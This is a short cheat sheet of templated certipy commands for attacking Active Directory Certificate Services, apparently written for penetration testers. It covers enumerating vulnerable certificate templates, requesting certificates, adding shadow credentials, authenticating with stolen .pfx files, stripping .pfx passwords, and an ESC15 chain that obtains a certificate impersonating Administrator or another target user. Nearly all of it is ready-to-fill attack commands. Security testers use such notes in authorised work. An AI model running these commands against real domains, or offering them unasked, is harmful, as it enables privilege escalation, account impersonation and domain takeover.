# certipy
#target/remote #os/linux #cat/ad

## certipy find templates
```
certipy find -<type|enabled> -u '<user>'@<domain> <auth> -target <ca_fqdn> -dc-ip <dc_ip> -stdout -json -timeout 2
```

## certipy request template
```
certipy req -u '<user>'@<domain> <auth> -target <ca_fqdn> -dc-ip <dc_ip> -ca <ca> -template <template>
```

## certipy shadow cred
```
certipy shadow auto -u '<user>'@<domain> <auth> -target <ca_fqdn> -dc-ip <dc_ip> -account <target_obj>
```

## certipy authenticate using .pfx
```
certipy auth -pfx <pfx> -username '<user>' -domain <domain> -dc-ip <dc_ip>
```

## certipy remove password from .pfx
```
certipy cert -pfx <protected_pfx> -password '<password>' -export -out <unprotected_pfx|nopass.pfx>
```

## certipy dump info from .pfx
```
certipy cert -pfx <pfx> -out /tmp/temp.pem

openssl x509 -in /tmp/temp.pem -text -noout

rm /tmp/temp.pem
```

## certipy export .crt and .key from .pfx
```
certipy cert -pfx <pfx> -nocert -out <out_key>

certipy cert -pfx <pfx> -nokey -out <out_crt>
```

## certipy esc15 (scenario b)
```
certipy req -u '<user>'@<domain> <auth> -dc-ip <dc_ip> -target <ca_fqdn> -ca <ca> -template <vuln_template> -upn '<target_user>@<domain>' -application-policies 'Certificate Request Agent'

certipy req -u '<user>'@<domain> <auth> -target <ca_fqdn> -dc-ip <dc_ip> -ca <ca> -template '<user_template|User>' -pfx <target_user|Administrator>.pfx -on-behalf-of '<netbios>\<target_user>'

certipy auth -pfx '<target_user>.pfx' -dc-ip <dc_ip>
```
